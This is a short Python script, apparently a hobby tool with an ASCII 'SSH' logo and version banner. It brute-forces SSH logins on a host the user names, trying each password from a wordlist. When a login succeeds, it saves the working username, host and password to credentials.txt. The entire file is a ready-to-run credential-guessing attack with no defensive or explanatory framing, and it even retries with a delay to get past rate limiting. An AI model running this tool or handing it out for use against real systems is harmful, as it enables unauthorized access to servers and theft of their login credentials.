import paramiko
import socket
import time
from colorama import init, Fore
init()

GREEN = Fore.GREEN
RED   = Fore.MAGENTA
RESET = Fore.RESET
BLUE  = Fore.BLUE

def is_ssh_open(hostname, username, password):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        client.connect(hostname=hostname, username=username, password=password, timeout=3)
    except socket.timeout:
        print(f"{RED}[!] Host: {hostname} is unreachable, timed out.{RESET}")
        return False
    except paramiko.AuthenticationException:
        print(f"{RED}[!] Invalid credentials for {username}:{password}{RESET}")
        return False
    except paramiko.SSHException:
        print(f"{BLUE}[*] Quota exceeded, retrying with delay...{RESET}")
        time.sleep(60)
        return is_ssh_open(hostname, username, password)
    else:
        print(f"{GREEN}[+] Found combo:\n\tHOSTNAME: {hostname}\n\tUSERNAME: {username}\n\tPASSWORD: {password}{RESET}")
        print("Result saved in credentials.txt")
        return True

logo = f"""{RED}

 .----------------.  .----------------.  .----------------.
| .--------------. || .--------------. || .--------------. |
| |    _______   | || |    _______   | || |  ____  ____  | |
| |   /  ___  |  | || |   /  ___  |  | || | |_   ||   _| | |
| |  |  (__ \_|  | || |  |  (__ \_|  | || |   | |__| |   | |
| |   '.___`-.   | || |   '.___`-.   | || |   |  __  |   | |
| |  |`\____) |  | || |  |`\____) |  | || |  _| |  | |_  | |
| |  |_______.'  | || |  |_______.'  | || | |____||____| | |
| |              | || |              | || |              | |
| '--------------' || '--------------' || '--------------' |
 '----------------'  '----------------'  '----------------'
                                                by Noah Oksuz   
                                                        V0.1
{RESET}   """
print(logo)
host = input("Please enter the target host: ") 
user = input("Which username do you want to brute: ")
passlist = input("Please enter the path of the password wordlist: ")
passlist = open(passlist).read().splitlines()
for password in passlist:
    if is_ssh_open(host, user, password):
        open("credentials.txt", "w").write(f"{user}@{host}:{password}")
        break